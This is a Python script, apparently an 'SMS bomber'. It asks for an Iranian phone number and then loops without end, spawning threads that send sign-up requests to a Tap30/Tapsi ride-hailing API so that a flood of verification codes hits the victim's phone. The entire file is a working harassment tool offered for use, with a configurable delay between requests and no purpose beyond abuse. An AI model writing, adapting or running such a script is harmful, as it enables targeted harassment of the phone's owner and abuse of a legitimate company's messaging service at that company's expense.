from platform import node, system, release; Node, System, Release = node(), system(), release() 
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread, active_count
import urllib3; urllib3.disable_warnings()
from time import sleep


try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")   
def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except:
        pass

def is_phone(phone: str):
    phone = sub("\s+", "" ,phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1::]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else: 
        return False

def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(.01)
def start(x: int, S: str):
    if active_count() < x:
        exec(S)
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'

def Vip(phone, Time):
    Thread(target=tap30, args=[phone]).start(), sleep(Time)

while True:
    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
try:
    Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'))
except ValueError:
    Time = 0.1
    print(f"{g}[0.1] {w}Used")
while True:
    try: Vip(phone, Time)
    except KeyboardInterrupt: exit(f'{r}[-] User Exited')
    except: print(f'{r}[-] Error TimeOut')